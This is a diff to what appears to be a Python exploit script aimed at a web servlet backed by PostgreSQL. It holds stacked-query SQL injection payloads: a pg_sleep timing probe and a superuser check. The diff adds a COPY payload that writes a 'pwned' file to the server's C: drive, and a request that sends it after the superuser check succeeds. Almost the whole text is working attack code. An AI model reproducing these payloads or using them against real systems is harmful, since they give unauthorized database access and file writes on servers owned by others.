@@ -45,6 +45,7 @@ base_url = "https://test/servlet/AMUserResourcesSyncServlet?ForMasRange=1&userId
 # -----PostgreSQL payloads-----
 pgq_sleep = ";select+pg_sleep(10);"
 pgq_superuser = ";SELECT+case+when+(SELECT+current_setting($$is_superuser$$))=$$on$$+then+pg_sleep(10)+end;--"
+pgq_write = ";COPY (SELECT $$pwned$$) to $$c:\\pwned.txt$$;--"
 
 # -----Request-----
 try:
@@ -59,6 +60,7 @@ try:
         elapsed = response.elapsed.total_seconds()
         if elapsed >= 10:
             print(f"Success. Response time: {elapsed} seconds.\nYou are superuser.")
+            response = session.get(base_url + pgq_write, timeout=25)
         else:
             print("Superuser check failed.")
     else:
